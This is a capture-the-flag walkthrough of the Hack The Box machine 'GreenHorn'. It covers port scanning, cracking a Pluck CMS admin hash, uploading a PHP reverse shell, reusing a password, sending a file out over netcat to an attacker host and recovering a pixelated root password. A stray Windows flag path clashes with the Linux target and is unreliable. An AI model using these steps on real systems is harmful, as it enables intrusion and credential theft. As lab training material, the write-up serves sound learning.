
# HTB Walkthrough: GreenHorn

**GreenHorn** is an easy-difficulty machine that leverages a vulnerability in Pluck CMS for remote code execution and highlights the risks of pixelated credentials. It also demonstrates the importance of securing open-source configurations to prevent leaking sensitive information, such as passwords.

---

## Task 1: How many TCP ports are listening on GreenHorn?

I started with an Nmap scan to identify the open ports:


```bash
nmap -sC -sV TARGET_IP
```


<img width="661" alt="Screenshot 2024-12-09 at 22 05 13" src="https://github.com/user-attachments/assets/7c67198b-0881-49ed-9edd-1bdb10345a9c">


The results revealed two open TCP ports. To proceed, I added the machine’s hostname to my /etc/hosts file: 

<img width="648" alt="Screenshot 2024-12-09 at 22 05 39" src="https://github.com/user-attachments/assets/4ce72ce8-0e76-45b7-a7f3-ca9be76c0699">


This resolved the hostname greenhorn.htb to its IP address, allowing me to access the website.

<img width="662" alt="Screenshot 2024-12-09 at 22 09 02" src="https://github.com/user-attachments/assets/bf973dbe-1182-4156-9cd9-b619e0bea6ee">

---

## Task 2: What content management system (CMS) and version powers the website on TCP 80?

Visiting the website on port 80, I found that it uses Pluck CMS. Scrolling to the bottom of the homepage and clicking on the "Admin" section redirected me to a page that revealed the CMS version: 4.7.18.



<img width="614" alt="Screenshot 2024-12-09 at 22 09 21" src="https://github.com/user-attachments/assets/d07b6808-16d1-46f6-bd13-9c22fb04d924">


---

## Task 3: Where does Pluck save its admin hash?

I explored another open port and was directed to a repository containing the configuration files for the Pluck website. 

<img width="656" alt="Screenshot 2024-12-09 at 22 10 03" src="https://github.com/user-attachments/assets/6ed1ba1a-368d-4ed3-a4ae-9eb1601d916a">


In the login.php file, I discovered the file path where the admin hash is stored.



<img width="655" alt="Screenshot 2024-12-09 at 22 10 26" src="https://github.com/user-attachments/assets/e682bffd-c683-4b8e-b6ac-7764ca23fac4">


<img width="656" alt="Screenshot 2024-12-09 at 22 10 59" src="https://github.com/user-attachments/assets/5042428d-d5de-40c1-a417-dda57553cf13">

<img width="630" alt="Screenshot 2024-12-09 at 22 11 12" src="https://github.com/user-attachments/assets/b29f33f9-c43d-4f59-8f0f-18f98a2cdfdb">


---

## Task 4: What is the admin password for this Pluck instance?

Navigating to the specified file path in the repository, I located the admin hash.


<img width="650" alt="Screenshot 2024-12-09 at 22 11 44" src="https://github.com/user-attachments/assets/824742c4-693e-404c-9f71-003a34d01cd2">


After saving the hash in a file, I used John the Ripper to crack it:

```bash
john --wordlist=/path/to/rockyou.txt hashfile  
```


<img width="660" alt="Screenshot 2024-12-09 at 22 13 12" src="https://github.com/user-attachments/assets/5fda4310-29d6-4506-81ea-38c2d52c7f15">



Note: If using the HTB-provided machine, the rockyou.txt file is archived. Extract it first using:

```bash
sudo gunzip /usr/share/wordlists/rockyou.txt.gz  
```


---

## Task 5: What system user on Greenhorn is the Pluck instance running as?

With the cracked admin password, I logged into the Pluck admin panel. 

<img width="639" alt="Screenshot 2024-12-09 at 22 14 05" src="https://github.com/user-attachments/assets/296382f2-f732-4e6c-86d4-1d9e67ef2790">



<img width="644" alt="Screenshot 2024-12-09 at 22 14 57" src="https://github.com/user-attachments/assets/6df27149-eeed-44ce-a4f3-66823b946db3">

I uploaded a basic PHP reverse shell script from PentestMonkey:  https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
Obs: To bypass restrictions, I first zipped the PHP file and uploaded it.

From here, I started a Netcat listener and connected:

```bash

nc -lvnp PORT  
```

Afterward, I navigated to the shell:

http://greenhorn.htb/data/modules/shell/shell.php  

<img width="662" alt="Screenshot 2024-12-09 at 22 15 24" src="https://github.com/user-attachments/assets/30b153d0-1899-4e25-bcdb-723a5d385e03">

---

## Task 6: What is the junior user’s password on GreenHorn?

Exploring the home directory, I found a user named junior. 

<img width="586" alt="Screenshot 2024-12-09 at 22 17 25" src="https://github.com/user-attachments/assets/d60c4794-03f0-4211-aec2-69f0caf3f262">

Testing the admin password, I discovered it also worked for junior.


---
## User Flag


```bash

cat /home/junior/user.txt

```
---

## Task 7: Besides the user flag, what is the name of the other document in the junior user’s home directory?

In addition to the user flag, I discovered another document in the junior home directory: a PDF file.

<img width="577" alt="Screenshot 2024-12-09 at 22 18 31" src="https://github.com/user-attachments/assets/8b96fc05-4193-4523-9483-81ee51a6e21f">

---

## Task 8: What is the root user’s password?

In the junior user’s home directory, I found a PDF document containing pixelated text that appeared to hold the root user’s password. To analyze it, I transferred the file to my local machine using Netcat:

On my local machine, I opened a Netcat listener on a port:

```bash
nc -lvnp PORT > document.pdf  
```
From the junior user’s shell, I sent the file over the Netcat connection:

```bash

nc ATTACKER_IP PORT < /path/to/document.pdf  
```
This method allowed me to copy the file to my local machine. Upon opening the PDF, I observed that the root user shared their password with junior, but it was pixelated.

<img width="584" alt="Screenshot 2024-12-09 at 22 23 53" src="https://github.com/user-attachments/assets/3ff9688d-8d6c-436e-afab-0ec38f1fa7bc">

To recover the password, I used Depix.

Clone the Depix repository:

```bash
git clone https://github.com/spipm/Depix.git  
cd Depix  
```
Save the pixelated image from the PDF to a file and run the following command to reconstruct the text:

```bash

python3 depix.py -p /path/to/image.png -s ./images/searchimages/debruinseq_notepad_Windows10_closeAndSpaced.png -o /path/to/output.png  

```
<img width="662" alt="Screenshot 2024-12-09 at 22 24 55" src="https://github.com/user-attachments/assets/53845bbd-cf27-426a-9158-ccb1120596d2">

The output image revealed the root user’s password.

<img width="651" alt="Screenshot 2024-12-09 at 22 25 15" src="https://github.com/user-attachments/assets/129a7a6e-5a53-459a-b8a2-38ca52ec1910">


---

## User Flag

The user flag was located in:
`C:/Users/daniel/Desktop/user.txt`

---

## Root Flag

Using the root credentials, I switched to the root user and retrieved the root flag:

<img width="629" alt="Screenshot 2024-12-09 at 22 27 27" src="https://github.com/user-attachments/assets/c8c1e716-16f1-46e8-9cdd-28254efe1632">



```bash

cat /root/root.txt
```
---

## Conclusion

The **GreenHorn** machine demonstrated vulnerabilities in poorly secured CMS configurations, file uploads, and shared credentials. It reinforced the importance of securing sensitive information and leveraging tools like Depix for creative solutions.
